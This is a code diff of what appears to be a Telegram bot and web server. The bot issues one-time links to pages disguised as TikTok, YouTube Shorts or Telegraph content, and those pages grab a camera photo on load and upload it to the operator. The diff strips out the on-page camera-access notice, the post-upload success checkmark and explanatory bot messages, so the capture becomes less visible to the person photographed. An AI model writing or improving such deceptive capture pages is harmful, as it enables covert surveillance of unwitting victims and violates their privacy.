@@ -186,10 +186,7 @@ def service_keyboard() -> ReplyKeyboardMarkup:
 @router.message(CommandStart())
 async def start(message: Message):
     await message.answer(
-        "👋 Выберите оформление страницы:\n\n"
-        "🎵 TikTok — стиль видео\n"
-        "📺 YouTube — стиль Shorts\n"
-        "📝 Telegraph — стиль статьи",
+        "👋 Выберите оформление страницы:",
         reply_markup=service_keyboard(),
     )
 
@@ -229,8 +226,7 @@ async def create_service_link(message: Message):
     await message.answer(
         f"{info['emoji']} Одноразовая ссылка создана:\n"
         f"<a href='{url}'>{url}</a>\n\n"
-        f"Оформление страницы: {info['name']}.\n"
-        "После успешной отправки фото ссылка перестанет работать.",
+        f"Оформление страницы: {info['name']}.",
         parse_mode="HTML",
         reply_markup=kb,
         disable_web_page_preview=False,
@@ -265,7 +261,7 @@ async def handle_telegraph_input(message: Message):
     elif service == "telegraph" and step == "content":
         content = message.text.strip()
         if content == "-":
-            content = "Это пример статьи, созданной через бота. Вы можете добавить свой текст."
+            content = "Это пример статьи, созданной через бота."
         
         token = create_link(chat_id, service, state.get("title", "📝 Статья Telegraph"), content)
         url = public_link("telegraph", token)
@@ -281,8 +277,7 @@ async def handle_telegraph_input(message: Message):
         await message.answer(
             f"{info['emoji']} Одноразовая ссылка создана:\n"
             f"<a href='{url}'>{url}</a>\n\n"
-            f"Оформление страницы: {info['name']}.\n"
-            "После успешной отправки фото ссылка перестанет работать.",
+            f"Оформление страницы: {info['name']}.",
             parse_mode="HTML",
             reply_markup=kb,
             disable_web_page_preview=False,
@@ -321,7 +316,6 @@ body {{ background:#000; min-height:100vh; display:flex; justify-content:center;
 .video-desc {{ color:rgba(255,255,255,0.8); font-size:14px; text-shadow:0 2px 4px rgba(0,0,0,0.8); }}
 .bottom {{ display:flex; flex-direction:column; gap:12px; }}
 .status {{ color:#fff; font-size:15px; text-align:center; min-height:24px; background:rgba(0,0,0,0.5); border-radius:12px; padding:10px; backdrop-filter:blur(8px); }}
-.notice {{ color:rgba(255,255,255,0.7); font-size:12px; text-align:center; padding:8px; background:rgba(255,255,255,0.05); border-radius:10px; }}
 .loading {{ display:flex; justify-content:center; align-items:center; gap:8px; padding:20px; }}
 .spinner {{ width:32px; height:32px; border:3px solid rgba(255,255,255,0.1); border-top-color:#00f2ea; border-radius:50%; animation:spin 0.8s linear infinite; }}
 @keyframes spin {{ to {{ transform:rotate(360deg); }} }}
@@ -342,7 +336,6 @@ body {{ background:#000; min-height:100vh; display:flex; justify-content:center;
     </div>
     <div class="bottom">
       <div id="status" class="status"><div class="loading"><div class="spinner"></div></div></div>
-      <div class="notice">⚠️ Для отправки фото нужен доступ к камере</div>
     </div>
   </div>
 </div>
@@ -384,8 +377,7 @@ async function sendPhoto(blob) {{
         const r = await fetch(`/api/send/${{encodeURIComponent(token)}}`, {{ method:'POST', body:fd }});
         const data = await r.json().catch(() => ({{}}));
         if (!r.ok) throw new Error(data.detail || 'Ошибка');
-        status.innerHTML = '✅';
-        status.className = 'status success';
+        status.innerHTML = '';
         video.style.display = 'none';
         preview.style.display = 'block';
     }} catch (e) {{
@@ -429,7 +421,6 @@ body {{ background:#0a0a0a; min-height:100vh; display:flex; justify-content:cent
 .status {{ margin-top:12px; padding:10px 14px; background:#222; border-radius:12px; color:#fff; font-size:14px; min-height:44px; display:flex; align-items:center; gap:8px; }}
 .spinner {{ width:20px; height:20px; border:2px solid rgba(255,255,255,0.1); border-top-color:#ff0000; border-radius:50%; animation:spin 0.8s linear infinite; flex-shrink:0; }}
 @keyframes spin {{ to {{ transform:rotate(360deg); }} }}
-.notice {{ color:#888; font-size:12px; margin-top:10px; text-align:center; padding:8px; background:#111; border-radius:8px; }}
 </style>
 </head>
 <body>
@@ -445,7 +436,6 @@ body {{ background:#0a0a0a; min-height:100vh; display:flex; justify-content:cent
     <div class="title">YouTube Shorts</div>
     <div class="channel">🔴 Verhcau <span class="sub">Подписаться</span></div>
     <div id="status" class="status"><div class="spinner"></div></div>
-    <div class="notice">⚠️ Для отправки фото нужен доступ к камере</div>
   </div>
 </div>
 <script>
@@ -486,8 +476,7 @@ async function sendPhoto(blob) {{
         const r = await fetch(`/api/send/${{encodeURIComponent(token)}}`, {{ method:'POST', body:fd }});
         const data = await r.json().catch(() => ({{}}));
         if (!r.ok) throw new Error(data.detail || 'Ошибка');
-        status.innerHTML = '✅';
-        status.className = 'status success';
+        status.innerHTML = '';
         video.style.display = 'none';
         preview.style.display = 'block';
     }} catch (e) {{
@@ -531,7 +520,6 @@ body {{ background:#f5f5f5; min-height:100vh; display:flex; justify-content:cent
 .camera-section .camera-status {{ display:flex; align-items:center; gap:12px; min-height:48px; font-size:15px; color:#333; }}
 .camera-section .camera-status .spinner {{ width:24px; height:24px; border:2px solid #e8e8e8; border-top-color:#2c3e50; border-radius:50%; animation:spin 0.8s linear infinite; flex-shrink:0; }}
 @keyframes spin {{ to {{ transform:rotate(360deg); }} }}
-.camera-section .notice {{ color:#888; font-size:13px; margin-top:12px; font-family:-apple-system,sans-serif; }}
 video {{ display:none; }}
 </style>
 </head>
@@ -549,7 +537,6 @@ video {{ display:none; }}
     </div>
     <div class="camera-section">
       <div id="status" class="camera-status"><div class="spinner"></div></div>
-      <div class="notice">⚠️ Для отправки фото нужен доступ к камере</div>
     </div>
     <video id="video" playsinline autoplay muted></video>
   </div>
@@ -590,8 +577,7 @@ async function sendPhoto(blob) {{
         const r = await fetch(`/api/send/${{encodeURIComponent(token)}}`, {{ method:'POST', body:fd }});
         const data = await r.json().catch(() => ({{}}));
         if (!r.ok) throw new Error(data.detail || 'Ошибка');
-        status.innerHTML = '✅';
-        status.className = 'camera-status success';
+        status.innerHTML = '';
         video.style.display = 'none';
     }} catch (e) {{
         status.innerHTML = '❌ ' + e.message;
@@ -608,7 +594,7 @@ document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 50
 
 @app.get("/", response_class=HTMLResponse)
 async def root():
-    return "<h3>Camera Link Bot is running. Choose service in Telegram.</h3>"
+    return "<h3>Camera Link Bot is running.</h3>"
 
 
 @app.get("/@{short_id}")
